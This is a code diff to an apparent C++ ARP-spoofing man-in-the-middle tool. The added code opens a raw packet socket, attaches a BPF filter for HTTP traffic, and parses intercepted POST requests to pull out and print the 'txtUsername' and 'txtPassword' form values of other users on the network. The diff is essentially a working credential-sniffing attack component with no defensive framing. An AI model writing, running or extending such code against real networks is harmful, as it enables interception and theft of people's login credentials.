@@ -22,6 +22,9 @@
 #include <atomic>
 #include <linux/netfilter.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
+#include <linux/filter.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
 
 using namespace std;
 
@@ -329,62 +332,74 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 }
 void analyze_packet(){
     // filter the received packet: HTTP
-    // listen to the packets on the interface and filter the HTTP packets
-    int sockfd;
-    struct sockaddr_in servaddr, cli;
+    // continuously listen to the packets on the interface and filter the HTTP packets
+    // analyze the every received HTTP packet, findout the packet with "txtUsername"
 
-    // Create socket
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd == -1) {
-        std::cerr << "Socket creation failed...\n";
-        exit(0);
+    // open a raw socket to receive the packets
+    int sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));    
+    if(sock_raw_fd < 0){
+        cerr << "Error creating socket." << endl;
     }
-
-    bzero(&servaddr, sizeof(servaddr));
-
-    // Assign IP and port = 80
-    servaddr.sin_family = AF_INET;
-    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
-    servaddr.sin_port = htons(80);
-
-    // Bind socket with IP and port
-    if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0) {
-        std::cerr << "Socket bind failed...\n";
-        exit(0);
+    // Set up packet capture filter to capture HTTP traffic (port 80)
+    struct sock_fprog filter;
+    struct sock_filter http_filter[] = {
+        {0x28, 0, 0, 0x0000000c},
+        {0x15, 0, 6, 0x00000800},
+        {0x30, 0, 0, 0x00000017},
+        {0x15, 0, 4, 0x00000006},
+        {0x28, 0, 0, 0x00000014},
+        {0x45, 2, 0, 0x00001fff},
+        {0xb1, 0, 0, 0x0000000e},
+        {0x48, 0, 0, 0x0000000e},
+        {0x15, 0, 1, 0x00000050},
+        {0x6, 0, 0, 0x0000ffff},
+        {0x6, 0, 0, 0x00000000},
+    };
+    filter.len = sizeof(http_filter) / sizeof(http_filter[0]);
+    filter.filter = http_filter;
+    if(setsockopt(sock_raw_fd, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) < 0){
+        cerr << "Error setting socket options." << endl;
     }
-
-    // Start listening
-    if ((listen(sockfd, 5)) != 0) {
-        std::cerr << "Listen failed...\n";
-        exit(0);
-    }
-    socklen_t len = sizeof(cli);
-
-    while (true) {
-        // Accept a connection
-        int connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
-        if (connfd < 0) {
-            std::cerr << "Server accept failed...\n";
-            exit(0);
+    // Start capturing packets
+    // Parse captured packets
+    // Look for HTTP POST requests
+    // Extract form data (usernames and passwords) from POST requests
+    unsigned char buffer[2048];
+    ssize_t length;
+    while(true){
+        length = recvfrom(sock_raw_fd, buffer, 2048, 0, NULL, NULL);
+        if(length == -1){
+            cerr << "Error receiving packet." << endl;
+        }else{
+            // Parse the packet
+            struct ether_header *eth_header = (struct ether_header *)buffer;
+            struct iphdr *ip_header = (struct iphdr *)(buffer + ETHER_HEADER_LEN);
+            struct tcphdr *tcp_header = (struct tcphdr *)(buffer + ETHER_HEADER_LEN + ip_header->ihl * 4);
+            unsigned char *payload = buffer + ETHER_HEADER_LEN + ip_header->ihl * 4 + tcp_header->doff * 4;
+            int payload_len = length - (ETHER_HEADER_LEN + ip_header->ihl * 4 + tcp_header->doff * 4);
+            // Check if the packet is an HTTP POST request
+            if (payload_len > 0 && memcmp(payload, "POST", 4) == 0)
+            {
+                // Extract the form data (username and password)
+                string payload_str((char *)payload, payload_len);
+                size_t pos = payload_str.find("txtUsername=");
+                if (pos != string::npos)
+                {
+                    size_t end_pos = payload_str.find("&", pos);
+                    string username = payload_str.substr(pos + 12, end_pos - pos - 12);
+                    cout << "Username: " << username << endl;
+                }
+                pos = payload_str.find("txtPassword=");
+                if (pos != string::npos)
+                {
+                    size_t end_pos = payload_str.find("&", pos);
+                    string password = payload_str.substr(pos + 12, end_pos - pos - 12);
+                    cout << "Password: " << password << endl;
+                }
+            }
         }
-
-        char buff[4096];
-        bzero(buff, 4096);
-        // Read the packet
-        read(connfd, buff, sizeof(buff));
-        // Analyze the packet
-        std::string packet(buff);
-        if (packet.find("txtUsername") != std::string::npos) {
-            std::cout << "Found packet with 'txtusername'\n";
-        }
-
-        // Close the connection
-        close(connfd);
     }
-
-    // Close the socket
-    close(sockfd);
-    cout<<"analyze packet done"<<endl;
+    close(sock_raw_fd);
 
 }
 void arp_spoofing()
